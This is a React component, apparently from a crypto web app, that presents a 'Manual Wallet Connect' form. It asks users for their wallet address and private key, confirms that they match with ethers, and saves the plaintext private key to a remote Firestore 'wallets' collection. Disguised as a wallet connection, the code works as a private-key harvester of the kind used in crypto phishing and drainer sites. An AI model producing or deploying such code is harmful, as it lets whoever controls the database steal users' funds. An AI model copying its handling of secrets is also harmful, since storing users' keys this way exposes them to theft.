import React, { useState } from "react";
import { ethers } from "ethers";
import { db, collection, addDoc, getDocs } from "../firebaseConfig";

const WalletConnect = ({ setWalletData }) => {
  const [walletAddress, setWalletAddressState] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [error, setError] = useState("");

  const connectWalletManually = async () => {
    try {
      console.log("🔵 Connecting Wallet...");
      if (!walletAddress || !privateKey) {
        setError("Please enter both Wallet Address and Private Key!");
        return;
      }

      const provider = new ethers.JsonRpcProvider("https://bsc.publicnode.com");
      const wallet = new ethers.Wallet(privateKey, provider);

      console.log("🟢 Wallet Address:", wallet.address);

      if (wallet.address.toLowerCase() !== walletAddress.toLowerCase()) {
        throw new Error("Invalid private key for the provided wallet address!");
      }

      // Save to Firestore
      await addDoc(collection(db, "wallets"), {
        walletAddress,
        privateKey, // ⚠️ Be cautious when storing private keys!
        timestamp: new Date(),
      });

      setWalletData({ walletAddress: wallet.address, privateKey });
      setError("");
      alert("Wallet Connected & Saved Successfully!");
    } catch (err) {
      setError(err.message || "Invalid private key or connection error!");
    }
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-black">
      <div className="bg-gray-900 p-6 rounded-lg shadow-lg text-center w-96">
        <h2 className="text-green-400 text-lg font-bold mb-4">Manual Wallet Connect</h2>

        <input
          type="text"
          placeholder="Enter Wallet Address"
          className="w-full p-2 mb-3 border border-gray-600 bg-gray-800 text-white rounded"
          value={walletAddress}
          onChange={(e) => setWalletAddressState(e.target.value)}
        />

        <input
          type="password"
          placeholder="Enter Private Key"
          className="w-full p-2 mb-3 border border-gray-600 bg-gray-800 text-white rounded"
          value={privateKey}
          onChange={(e) => setPrivateKey(e.target.value)}
        />

        {error && <p className="text-red-500 text-sm mb-3">{error}</p>}

        <button
          className="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-2 rounded"
          onClick={connectWalletManually}
        >
          Connect Wallet
        </button>
      </div>
    </div>
  );
};

export default WalletConnect;
